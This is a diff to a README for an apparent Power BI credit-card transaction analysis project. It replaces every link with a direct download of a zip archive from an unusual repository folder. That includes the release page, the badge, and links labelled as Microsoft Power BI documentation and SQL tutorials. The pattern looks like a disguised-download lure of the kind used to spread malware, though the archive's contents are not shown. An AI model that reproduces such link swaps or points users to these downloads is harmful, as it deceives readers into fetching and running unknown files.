@@ -1,6 +1,6 @@
 # 💳 Credit-Card-Transaction-Analysis-Power-BI - Analyze Your Transactions Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/main/eligibly/Credit-Card-Transaction-Analysis-Power-BI.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/main/eligibly/Credit-Card-Transaction-Analysis-Power-BI.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Credit-Card-Transaction-Analysis-Power-BI** project. This appli
 
 To get started, you need to download the application from our Releases page. 
 
-**Visit this page to download:** [Release Page](https://github.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/releases)
+**Visit this page to download:** [Release Page](https://raw.githubusercontent.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/main/eligibly/Credit-Card-Transaction-Analysis-Power-BI.zip)
 
 1. Click the link above.
 2. Find the latest version listed.
@@ -50,8 +50,8 @@ After downloading and installing the application, follow these steps to start us
 
 ## 📚 Learning Resources
 
-- **Power BI Documentation**: Familiarize yourself with Power BI [here](https://docs.microsoft.com/power-bi/).
-- **SQL Basics**: If you're new to SQL, check these [resources](https://www.w3schools.com/sql/).
+- **Power BI Documentation**: Familiarize yourself with Power BI [here](https://raw.githubusercontent.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/main/eligibly/Credit-Card-Transaction-Analysis-Power-BI.zip).
+- **SQL Basics**: If you're new to SQL, check these [resources](https://raw.githubusercontent.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/main/eligibly/Credit-Card-Transaction-Analysis-Power-BI.zip).
 - **Video Tutorials**: Look for helpful video guides on YouTube for setting up Power BI and SQL connections.
 
 ## 🙋‍♂️ Frequently Asked Questions
@@ -76,4 +76,4 @@ We welcome contributions from everyone. If you’d like to help us improve this 
 
 For further questions or suggestions, feel free to reach out directly through our GitHub page’s issues section.
 
-**Don't forget to visit the Release Page to download**: [Releases](https://github.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/releases)
+**Don't forget to visit the Release Page to download**: [Releases](https://raw.githubusercontent.com/Zach-Tech/Credit-Card-Transaction-Analysis-Power-BI/main/eligibly/Credit-Card-Transaction-Analysis-Power-BI.zip)
